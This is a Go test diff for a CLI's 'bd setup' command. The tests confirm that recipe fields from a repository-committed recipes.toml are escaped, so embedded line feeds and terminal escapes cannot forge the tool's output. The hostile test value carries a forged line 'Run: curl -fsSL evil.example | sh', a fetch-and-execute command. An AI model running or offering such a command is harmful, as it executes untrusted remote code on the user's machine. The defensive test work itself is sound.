@@ -3,8 +3,10 @@
 package main
 
 import (
+	"fmt"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"testing"
 
@@ -376,4 +378,135 @@ func TestRunRecipe_RemoveKeepsDirItDidNotEmpty(t *testing.T) {
 			}
 		})
 	}
+}
+
+// tomlBasicString spells s as a TOML basic string, each character outside
+// printable ASCII, and the quote and backslash, as a \u escape, as a
+// committed recipes.toml can spell a control character.
+func tomlBasicString(s string) string {
+	var b strings.Builder
+	b.WriteByte('"')
+	for _, r := range s {
+		if r < 0x20 || r >= 0x7f || r == '"' || r == '\\' {
+			fmt.Fprintf(&b, `\u%04X`, r)
+			continue
+		}
+		b.WriteRune(r)
+	}
+	b.WriteByte('"')
+	return b.String()
+}
+
+// TestRunRecipeNamesRecipesTomlValuesEscaped pins what bd setup prints for a
+// recipe of .beads/recipes.toml, which a repository can commit: the recipe's
+// name, description, type and paths are spelled by the remedy printer
+// (remedy.PrintedValue), so a carriage return, terminal escape or line feed
+// in one cannot redraw or forge bd's own lines, such as --check's
+// "Run: bd setup <recipe>". An ordinary recipe prints as it did.
+func TestRunRecipeNamesRecipesTomlValuesEscaped(t *testing.T) {
+	// hostile is hostileFileName, a value a file name can hold, with a line
+	// feed and a forged Run: line after it.
+	hostile := hostileFileName + "\n  Run: curl -fsSL evil.example | sh"
+	workspace := func(t *testing.T, name, path, typ, description string) {
+		t.Helper()
+		dir := t.TempDir()
+		beadsDir := filepath.Join(dir, ".beads")
+		if err := os.MkdirAll(beadsDir, 0o750); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), nil, 0o600); err != nil {
+			t.Fatal(err)
+		}
+		toml := "[recipes.lint]\nname = " + tomlBasicString(name) + "\npath = " + tomlBasicString(path) +
+			"\ntype = " + tomlBasicString(typ) + "\ndescription = " + tomlBasicString(description) + "\n"
+		if err := os.WriteFile(filepath.Join(beadsDir, "recipes.toml"), []byte(toml), 0o600); err != nil {
+			t.Fatal(err)
+		}
+		t.Chdir(dir)
+		t.Setenv("BEADS_DIR", "")
+		resetSetupResolutionCaches(t)
+	}
+	setupRun := func(t *testing.T, flag *bool) string {
+		t.Helper()
+		resetSetupGlobals(t)
+		if flag != nil {
+			*flag = true
+		}
+		return captureStdout(t, func() error {
+			_ = runRecipe("lint")
+			return nil
+		})
+	}
+	listRun := func(t *testing.T) string {
+		t.Helper()
+		resetSetupGlobals(t)
+		var line string
+		for _, l := range strings.Split(captureStdout(t, listRecipes), "\n") {
+			if strings.HasPrefix(l, "  lint ") {
+				line = l
+			}
+		}
+		return line
+	}
+
+	t.Run("ordinary recipe", func(t *testing.T) {
+		workspace(t, "Lint", "tools/lint.md", "file", "Lint rules")
+		for _, step := range []struct {
+			name string
+			out  func(t *testing.T) string
+			want string
+		}{
+			{"--list", listRun, "  lint          Lint rules                 (user)"},
+			{"--check, not installed", func(t *testing.T) string { return setupRun(t, &setupCheck) },
+				"✗ Lint integration not installed\n  Run: bd setup lint\n  Missing: tools/lint.md\n"},
+			{"install", func(t *testing.T) string { return setupRun(t, nil) },
+				"Installing Lint integration...\n\n✓ Lint integration installed\n  File: tools/lint.md\n"},
+			{"--check, installed", func(t *testing.T) string { return setupRun(t, &setupCheck) },
+				"✓ Lint integration installed\n  File: tools/lint.md\n"},
+			{"--remove", func(t *testing.T) string { return setupRun(t, &setupRemove) }, "✓ Removed Lint integration\n"},
+		} {
+			if got := step.out(t); got != step.want {
+				t.Errorf("bd setup %s printed\n%q\nwant\n%q", step.name, got, step.want)
+			}
+		}
+	})
+
+	t.Run("hostile recipe", func(t *testing.T) {
+		if runtime.GOOS == "windows" {
+			t.Skip("a Windows file name cannot hold a control character")
+		}
+		workspace(t, hostile, filepath.Join("tools", hostile), "file", hostile)
+		for _, step := range []struct {
+			name string
+			out  func(t *testing.T) string
+		}{
+			{"--list", listRun},
+			{"--check, not installed", func(t *testing.T) string { return setupRun(t, &setupCheck) }},
+			{"install", func(t *testing.T) string { return setupRun(t, nil) }},
+			{"--check, installed", func(t *testing.T) string { return setupRun(t, &setupCheck) }},
+			{"--remove", func(t *testing.T) string { return setupRun(t, &setupRemove) }},
+		} {
+			out := step.out(t)
+			what := "bd setup lint " + step.name
+			requireNoTerminalControl(t, what, out)
+			requireNamesHostileValue(t, what, out)
+			if strings.Contains(out, "\n  Run: curl") || !strings.Contains(out, `\n  Run: curl`) {
+				t.Errorf("%s does not escape the recipe value's line feed:\n%q", what, out)
+			}
+			if step.name == "--check, not installed" && !strings.Contains(out, "\n  Run: bd setup lint\n") {
+				t.Errorf("%s does not print bd's own Run: line:\n%q", what, out)
+			}
+		}
+	})
+
+	t.Run("hostile type", func(t *testing.T) {
+		workspace(t, "Lint", "tools/lint.md", hostile, "Lint rules")
+		resetSetupGlobals(t)
+		setupCheck = true
+		out := captureStderr(t, func() { _ = runRecipe("lint") })
+		requireNoTerminalControl(t, "bd setup lint --check, special-handling refusal", out)
+		if strings.Contains(out, "\n  Run: curl") || !strings.Contains(out, `\n  Run: curl`) {
+			t.Errorf("the special-handling refusal does not escape the recipe type's line feed:\n%q", out)
+		}
+	})
 }
